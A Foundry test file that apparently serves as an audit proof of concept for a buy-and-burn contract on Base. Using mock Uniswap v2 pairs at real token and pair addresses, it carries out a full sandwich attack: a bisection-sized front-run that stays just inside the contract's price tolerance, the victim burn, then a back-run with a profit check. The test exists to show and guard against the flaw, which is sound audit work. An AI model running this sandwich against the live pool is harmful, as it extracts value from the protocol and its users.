// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// Finding: a sandwich that stays inside MAX_DEVIATION_BPS on the USDC/WETH pair is profitable once that pair's USDC
// reserve is below about $330k (today: $438k), because DEPTH_BPS = 50 lets one burn take 0.5% of the reserve while the
// round-trip fee of a pump sized for deviation d is only 0.6% * d/2 of the reserve: the break-even is 0.3% of the
// reserve per burn. Mock pairs with the real Uniswap v2 K and fee rules, no fork. The pump is sized from the contract's
// own MAX_DEVIATION_BPS, so the test fails on this code and passes once the size cap or the tolerance is tightened
// (for example DEPTH_BPS <= 25, or MAX_PER_BURN bounded by 0.25% of the USDC reserve).

import {Test} from "forge-std/Test.sol";
import {IMDBuyAndBurn} from "src/IMDBuyAndBurn.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }
}

contract MockPair {
    address public token0;
    address public token1;
    uint112 r0;
    uint112 r1;
    uint32 last;
    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;

    function init(address t0, address t1) external {
        token0 = t0;
        token1 = t1;
        _update();
    }
    function getReserves() external view returns (uint112, uint112, uint32) { return (r0, r1, last); }
    function _update() internal {
        uint32 now32 = uint32(block.timestamp);
        unchecked {
            uint32 dt = now32 - last;
            if (dt > 0 && r0 != 0 && r1 != 0) {
                price0CumulativeLast += ((uint256(r1) << 112) / r0) * dt;
                price1CumulativeLast += ((uint256(r0) << 112) / r1) * dt;
            }
        }
        r0 = uint112(MockToken(token0).balanceOf(address(this)));
        r1 = uint112(MockToken(token1).balanceOf(address(this)));
        last = now32;
    }
    function swap(uint256 out0, uint256 out1, address to, bytes calldata) external {
        (uint256 o0, uint256 o1) = (r0, r1);
        if (out0 > 0) MockToken(token0).transfer(to, out0);
        if (out1 > 0) MockToken(token1).transfer(to, out1);
        uint256 b0 = MockToken(token0).balanceOf(address(this));
        uint256 b1 = MockToken(token1).balanceOf(address(this));
        uint256 in0 = b0 > o0 - out0 ? b0 - (o0 - out0) : 0;
        uint256 in1 = b1 > o1 - out1 ? b1 - (o1 - out1) : 0;
        require(in0 > 0 || in1 > 0, "INSUFFICIENT_INPUT");
        require((b0 * 1000 - in0 * 3) * (b1 * 1000 - in1 * 3) >= o0 * o1 * 1e6, "K");
        _update();
    }
}

// The swarm re-audit's proof for its finding 3 (IMD job dca64686), unchanged.
contract SandwichWithinToleranceTest is Test {
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant IMD = 0xFF0C532FDB8Cd566Ae169C1CB157ff2Bdc83E105;
    address constant PAIR_A = 0x88A43bbDF9D098eEC7bCEda4e2494615dfD9bB9C; // WETH/USDC
    address constant PAIR_B = 0xDE66c35e01ED8e619Bf092352338ef94f2327337; // WETH/IMD
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    IMDBuyAndBurn burner;
    address attacker = makeAddr("attacker");

    function _out(uint256 x, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
        uint256 f = x * 997;
        return (f * rOut) / (rIn * 1000 + f);
    }

    function setUp() public {
        vm.warp(1_760_000_000);
        address tok = address(new MockToken());
        vm.etch(USDC, tok.code);
        vm.etch(WETH, tok.code);
        vm.etch(IMD, tok.code);
        address pair = address(new MockPair());
        vm.etch(PAIR_A, pair.code);
        vm.etch(PAIR_B, pair.code);
        // USDC/WETH pair with $200k a side at $2,438/ETH (today: $438k); WETH/IMD pair as on Base today
        MockToken(WETH).mint(PAIR_A, 82.034e18);
        MockToken(USDC).mint(PAIR_A, 200_000e6);
        MockPair(PAIR_A).init(WETH, USDC);
        MockToken(WETH).mint(PAIR_B, 165.58e18);
        MockToken(IMD).mint(PAIR_B, 66_004e18);
        MockPair(PAIR_B).init(WETH, IMD);
        burner = new IMDBuyAndBurn();
    }

    /// Largest USDC buy of WETH in pair A that keeps the burn inside the contract's tolerance (bisection)
    function _spotAfterPump(uint256 spend, uint256 pump) internal view returns (uint256) {
        (uint112 w0, uint112 u0,) = MockPair(PAIR_A).getReserves();
        (uint112 wb, uint112 ib,) = MockPair(PAIR_B).getReserves();
        uint256 wOut = _out(pump, u0, w0);
        return (((spend * (uint256(w0) - wOut)) / (uint256(u0) + pump)) * ib) / wb;
    }

    function _pumpSize(uint256 spend, uint256 twapOut) internal view returns (uint256 lo) {
        uint256 floor_ = (twapOut * (10_000 - burner.MAX_DEVIATION_BPS())) / 10_000;
        (, uint112 u0,) = MockPair(PAIR_A).getReserves();
        uint256 hi = u0;
        for (uint256 i = 0; i < 100; i++) {
            uint256 mid = (lo + hi) / 2;
            if (_spotAfterPump(spend, mid) >= floor_) lo = mid;
            else hi = mid;
        }
        lo = (lo * 999) / 1000; // stay strictly inside
    }

    function test_SandwichInsideToleranceDoesNotPay() public {
        MockToken(USDC).mint(address(burner), 1_000e6);
        vm.warp(block.timestamp + 31 minutes);
        (uint256 spend, uint256 twapOut,, uint256 honestPoolOut,) = burner.preview();

        // Front-run: buy WETH with USDC so that USDC buys just under MAX_DEVIATION_BPS less WETH
        uint256 usdcIn = _pumpSize(spend, twapOut);
        MockToken(USDC).mint(attacker, usdcIn);
        (uint112 w0, uint112 u0,) = MockPair(PAIR_A).getReserves();
        uint256 wethGot = _out(usdcIn, u0, w0);
        vm.startPrank(attacker);
        MockToken(USDC).transfer(PAIR_A, usdcIn);
        MockPair(PAIR_A).swap(wethGot, 0, attacker, "");
        vm.stopPrank();

        (,, uint256 spotOut, uint256 poolOut,) = burner.preview();
        emit log_named_uint("spot/twap bps after the pump", (spotOut * 10_000) / twapOut);
        emit log_named_decimal_uint("attacker USDC in", usdcIn, 6);

        // Victim: the burn passes the price check
        uint256 burned = burner.buyAndBurn();
        assertEq(burned, poolOut);
        emit log_named_uint("burn loss vs no pump, bps", ((honestPoolOut - burned) * 10_000) / honestPoolOut);

        // Back-run: sell the WETH back
        (w0, u0,) = MockPair(PAIR_A).getReserves();
        uint256 usdcBack = _out(wethGot, w0, u0);
        vm.startPrank(attacker);
        MockToken(WETH).transfer(PAIR_A, wethGot);
        MockPair(PAIR_A).swap(0, usdcBack, attacker, "");
        vm.stopPrank();

        uint256 attackerUsdc = MockToken(USDC).balanceOf(attacker);
        emit log_named_decimal_int("attacker profit, USDC", int256(attackerUsdc) - int256(usdcIn), 6);
        assertLe(attackerUsdc, usdcIn, "a sandwich that stays inside the tolerance must not pay");
    }
}
